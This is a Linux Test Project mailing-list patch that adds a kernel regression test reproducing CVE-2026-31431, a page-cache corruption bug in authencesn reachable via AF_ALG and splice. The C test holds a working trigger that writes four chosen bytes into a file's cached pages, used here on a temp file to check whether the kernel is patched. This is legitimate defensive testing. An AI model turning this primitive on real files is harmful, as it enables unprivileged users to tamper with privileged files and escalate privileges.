Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 2527EFF8873
	for <ltp@archiver.kernel.org>; Thu, 30 Apr 2026 13:31:22 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id B6AC03E688C
	for <ltp@archiver.kernel.org>; Thu, 30 Apr 2026 15:31:20 +0200 (CEST)
Received: from in-7.smtp.seeweb.it (in-7.smtp.seeweb.it [217.194.8.7])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id EC1173E6C96
 for <ltp@lists.linux.it>; Thu, 30 Apr 2026 15:30:26 +0200 (CEST)
Received: from smtp-out2.suse.de (smtp-out2.suse.de
 [IPv6:2a07:de40:b251:101:10:150:64:2])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-7.smtp.seeweb.it (Postfix) with ESMTPS id 3202A200D07
 for <ltp@lists.linux.it>; Thu, 30 Apr 2026 15:30:26 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (imap1.dmz-prg2.suse.org
 [IPv6:2a07:de40:b281:104:10:150:64:97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out2.suse.de (Postfix) with ESMTPS id 19BAB5BD7F;
 Thu, 30 Apr 2026 13:30:20 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1777555821; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=TAatmm58bcOgsOVjOmnTvNAuT/7yEV7IfwC5c1HHrR8=;
 b=m2g9N3rDg7+EzJwMDEShvl9fMM++bdgFR9KOCE+cMj/z4i5GomtrGM0zUYyS106Xn/f87I
 vRkaujF3V3IHnb/VA4hWorM00aNanWeXArbzlaFMRAXiVv4oSGQyXgHsIjpUOM7+U8GpiR
 fmSWA9QoUbfaBEpTHGdbWVqyFs2sLYI=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1777555821;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=TAatmm58bcOgsOVjOmnTvNAuT/7yEV7IfwC5c1HHrR8=;
 b=WHEYTyg4CFlK9UbkoyzU9bOKg6Kkis4qM6UouVle3h4RdQgWFlvql0JlLFT6glf9F31jKl
 5cQXpQS7pW9J0dBA==
Authentication-Results: smtp-out2.suse.de;
 dkim=pass header.d=suse.de header.s=susede2_rsa header.b=vpyuFkOu;
 dkim=pass header.d=suse.de header.s=susede2_ed25519 header.b=rqk9mvMM
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1777555820; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=TAatmm58bcOgsOVjOmnTvNAuT/7yEV7IfwC5c1HHrR8=;
 b=vpyuFkOuJ4C/l48g7C/gWUVLYHckNp+mLUq1gK4fAyuy2Gl8KoiYjUhffS1Jq4IuBtFT36
 sRHG8pgxzeDSvjjkqQUFL25pETD2NT7W+Zu4/CcdlptpXuU0mzjHViHT5+WajY8nGYHnC9
 e7Ye0sx+N3P8QMjkQ6i+cfh30xiDn4Q=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1777555820;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=TAatmm58bcOgsOVjOmnTvNAuT/7yEV7IfwC5c1HHrR8=;
 b=rqk9mvMMkerH4Eucyi/lOxfli0iJDjmWaAkBkVGVhW6Oq/6XEdsavtebVwXwipJiSVk/hR
 IeY9VMrglhmhWrCg==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id ED288593B2;
 Thu, 30 Apr 2026 13:30:19 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id yMRiOGtZ82luOAAAD6G6ig
 (envelope-from <andrea.cervesato@suse.de>); Thu, 30 Apr 2026 13:30:19 +0000
From: Andrea Cervesato <andrea.cervesato@suse.de>
Date: Thu, 30 Apr 2026 15:30:17 +0200
MIME-Version: 1.0
Message-Id: <20260430-cve-2026-31431-v2-2-1136c09ca67b@suse.com>
References: <20260430-cve-2026-31431-v2-0-1136c09ca67b@suse.com>
In-Reply-To: <20260430-cve-2026-31431-v2-0-1136c09ca67b@suse.com>
To: Linux Test Project <ltp@lists.linux.it>
X-Mailer: b4 0.14.2
X-Developer-Signature: v=1; a=ed25519-sha256; t=1777555819; l=6288;
 i=andrea.cervesato@suse.com; s=20251210; h=from:subject:message-id;
 bh=AnYobZyCgFzEMbhIPiSeDRN6bAB7ADvKYARLiIZ8JBU=;
 b=JzDVuEoBwBF+7OiScOB4G8Km3QhWA7bfnt9MdzDDv3w16s8sLvZpqQQNF6A3hmZp5cHbNll7/
 8bL3eho20YIA4tacWueaceygHdvvOKCL1T5IRoe9IEvFeMy9HDG9MEh
X-Developer-Key: i=andrea.cervesato@suse.com; a=ed25519;
 pk=zKY+6GCauOiuHNZ//d8PQ/UL4jFCTKbXrzXAOQSLevI=
X-Spamd-Result: default: False [-4.51 / 50.00]; BAYES_HAM(-3.00)[100.00%];
 NEURAL_HAM_LONG(-1.00)[-1.000];
 R_DKIM_ALLOW(-0.20)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
 MX_GOOD(-0.01)[]; RCVD_TLS_ALL(0.00)[];
 FUZZY_RATELIMITED(0.00)[rspamd.com];
 RCVD_VIA_SMTP_AUTH(0.00)[]; MIME_TRACE(0.00)[0:+];
 ARC_NA(0.00)[];
 SPAMHAUS_XBL(0.00)[2a07:de40:b281:104:10:150:64:97:from];
 DWL_DNSWL_BLOCKED(0.00)[suse.de:dkim];
 DNSWL_BLOCKED(0.00)[2a07:de40:b281:104:10:150:64:97:from,2a07:de40:b281:106:10:150:64:167:received];
 DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 FROM_EQ_ENVFROM(0.00)[]; FROM_HAS_DN(0.00)[];
 RCPT_COUNT_THREE(0.00)[3]; RCVD_COUNT_TWO(0.00)[2];
 TO_MATCH_ENVRCPT_ALL(0.00)[];
 DBL_BLOCKED_OPENRESOLVER(0.00)[imap1.dmz-prg2.suse.org:helo,imap1.dmz-prg2.suse.org:rdns,suse.de:dkim,suse.com:mid,suse.com:email];
 TO_DN_ALL(0.00)[]; DKIM_TRACE(0.00)[suse.de:+]
X-Rspamd-Action: no action
X-Rspamd-Server: rspamd1.dmz-prg2.suse.org
X-Rspamd-Queue-Id: 19BAB5BD7F
X-Virus-Scanned: clamav-milter 1.0.9 at in-7.smtp.seeweb.it
X-Virus-Status: Clean
Subject: [LTP] [PATCH v2 2/2] cve-2026-31431: Add page cache corruption
 reproducer
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

From: Andrea Cervesato <andrea.cervesato@suse.com>

A logic bug in authencesn allows an unprivileged user to corrupt
4 bytes of page cache via AF_ALG + splice. The test writes known
data to a file, attempts corruption through the AEAD scratch-write
path, and verifies whether the file content was modified.

Tested-by: Avinesh Kumar <avinesh.kumar@suse.com>
Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
---
 runtest/cve                        |   1 +
 testcases/kernel/crypto/.gitignore |   1 +
 testcases/kernel/crypto/af_alg08.c | 164 +++++++++++++++++++++++++++++++++++++
 3 files changed, 166 insertions(+)

diff --git a/runtest/cve b/runtest/cve
index c3ecd74dd9f837924b810b7b431ebb911d809966..74300fb546a071ef2d1de3a02549eed35c9a57a4 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -93,3 +93,4 @@ cve-2022-0185 fsconfig03
 cve-2022-4378 cve-2022-4378
 cve-2025-38236 cve-2025-38236
 cve-2025-21756 cve-2025-21756
+cve-2026-31431 af_alg08
diff --git a/testcases/kernel/crypto/.gitignore b/testcases/kernel/crypto/.gitignore
index 448f986a6acc1341eac052ae9663e8fe28e18d4d..aca016b62110b319eb2825669ce23f5b3608c73e 100644
--- a/testcases/kernel/crypto/.gitignore
+++ b/testcases/kernel/crypto/.gitignore
@@ -5,6 +5,7 @@ af_alg04
 af_alg05
 af_alg06
 af_alg07
+af_alg08
 pcrypt_aead01
 crypto_user01
 crypto_user02
diff --git a/testcases/kernel/crypto/af_alg08.c b/testcases/kernel/crypto/af_alg08.c
new file mode 100644
index 0000000000000000000000000000000000000000..06166b6244c1d72e03e3ff8d7e87b1b3b76e93a9
--- /dev/null
+++ b/testcases/kernel/crypto/af_alg08.c
@@ -0,0 +1,164 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
+ */
+
+/*\
+ * Test for CVE-2026-31431 ("Copy Fail") fixed in kernel v7.0:
+ * a664bf3d603d ("crypto: algif_aead - Separate src from dst")
+ *
+ * A logic bug in authencesn, the kernel's AEAD wrapper for IPsec Extended
+ * Sequence Numbers, allows an unprivileged user to write 4 controlled bytes
+ * into the page cache of any readable file. During AEAD decryption,
+ * authencesn uses the destination scatterlist as scratch space for ESN byte
+ * rearrangement. When data is spliced from a file into an AF_ALG socket, the
+ * 2017 in-place optimization (72548b093ee3) places page cache pages into the
+ * writable destination scatterlist. authencesn's scratch write then corrupts
+ * those pages.
+ *
+ * The test creates a file with known data, attempts page cache corruption via
+ * the AF_ALG + splice technique, and verifies whether the file content was
+ * modified.
+ *
+ * Reproducer based on:
+ * https://github.com/theori-io/copy-fail-CVE-2026-31431
+ */
+
+#include "tst_test.h"
+#include "tst_af_alg.h"
+#include "lapi/socket.h"
+#include "lapi/splice.h"
+
+#define TESTFILE "copy_fail"
+#define OVERWRITE_SIZE 4
+#define AEAD_AUTHSIZE 4
+#define AEAD_ASSOCLEN 8
+#define AES_IV_SIZE 16
+#define SPI_SIZE 4
+
+static const uint8_t original[OVERWRITE_SIZE] = { 'X', 'X', 'X', 'X' };
+static const uint8_t payload[OVERWRITE_SIZE] = { 'P', 'W', 'N', 'D' };
+
+/*
+ * authenc key format: struct rtattr header (8 bytes) +
+ * HMAC-SHA256 key (16 bytes) + AES-128 key (16 bytes)
+ */
+static const uint8_t authenc_key[] = {
+	0x08, 0x00, 0x01, 0x00,
+	0x00, 0x00, 0x00, 0x10,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+};
+
+static int algfd = -1;
+static int reqfd = -1;
+static int pipefd[2] = { -1, -1 };
+static int file_fd = -1;
+
+static void try_corrupt(void)
+{
+	const uint8_t iv[AES_IV_SIZE] = { 0 };
+	uint8_t aad[AEAD_ASSOCLEN];
+	char recvbuf[AEAD_ASSOCLEN];
+	loff_t off_in = 0;
+
+	algfd = -1;
+	reqfd = -1;
+	pipefd[0] = -1;
+	pipefd[1] = -1;
+
+	/* AAD[0..3] = SPI (don't care), AAD[4..7] = ESN scratch-write zone */
+	memset(aad, 'A', SPI_SIZE);
+	memcpy(aad + SPI_SIZE, payload, OVERWRITE_SIZE);
+
+	algfd = tst_alg_setup("aead", "authencesn(hmac(sha256),cbc(aes))",
+			      authenc_key, sizeof(authenc_key));
+	SAFE_SETSOCKOPT(algfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL,
+			AEAD_AUTHSIZE);
+
+	reqfd = tst_alg_accept(algfd);
+
+	const struct tst_alg_sendmsg_params params = {
+		.decrypt = true,
+		.iv = iv,
+		.ivlen = AES_IV_SIZE,
+		.assoclen = AEAD_ASSOCLEN,
+		.msg_flags = MSG_MORE,
+	};
+
+	tst_alg_sendmsg(reqfd, aad, sizeof(aad), &params);
+
+	SAFE_PIPE(pipefd);
+
+	TEST(splice(file_fd, &off_in, pipefd[1], NULL, OVERWRITE_SIZE, 0));
+	if (TST_RET < 0)
+		tst_brk(TBROK | TTERRNO, "splice(file -> pipe)");
+
+	TEST(splice(pipefd[0], NULL, reqfd, NULL, OVERWRITE_SIZE, 0));
+	if (TST_RET < 0)
+		tst_brk(TBROK | TTERRNO, "splice(pipe -> AF_ALG)");
+
+	/* Expected to fail (invalid ciphertext); triggers the scratch write */
+	TST_EXP_FAIL_SILENT(recv(reqfd, recvbuf, sizeof(recvbuf), 0), EBADMSG);
+
+	SAFE_CLOSE(pipefd[0]);
+	SAFE_CLOSE(pipefd[1]);
+	SAFE_CLOSE(reqfd);
+	SAFE_CLOSE(algfd);
+}
+
+static void run(void)
+{
+	int fd;
+	uint8_t readback[OVERWRITE_SIZE];
+
+	fd = SAFE_OPEN(TESTFILE, O_WRONLY | O_CREAT, 0444);
+	SAFE_WRITE(SAFE_WRITE_ALL, fd, original, OVERWRITE_SIZE);
+	SAFE_CLOSE(fd);
+
+	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
+	try_corrupt();
+	SAFE_CLOSE(file_fd);
+
+	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
+	SAFE_READ(1, file_fd, readback, sizeof(readback));
+	SAFE_CLOSE(file_fd);
+
+	if (memcmp(readback, original, OVERWRITE_SIZE) != 0)
+		tst_res(TFAIL, "Page cache was corrupted via AF_ALG splice");
+	else
+		tst_res(TPASS, "Page cache was not corrupted");
+
+	SAFE_UNLINK(TESTFILE);
+}
+
+static void cleanup(void)
+{
+	if (pipefd[0] != -1)
+		SAFE_CLOSE(pipefd[0]);
+
+	if (pipefd[1] != -1)
+		SAFE_CLOSE(pipefd[1]);
+
+	if (reqfd != -1)
+		SAFE_CLOSE(reqfd);
+
+	if (algfd != -1)
+		SAFE_CLOSE(algfd);
+
+	if (file_fd != -1)
+		SAFE_CLOSE(file_fd);
+}
+
+static struct tst_test test = {
+	.test_all = run,
+	.cleanup = cleanup,
+	.needs_tmpdir = 1,
+	.tags = (const struct tst_tag[]) {
+		{"linux-git", "a664bf3d603d"},
+		{"CVE", "2026-31431"},
+		{}
+	},
+};

-- 
2.51.0


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
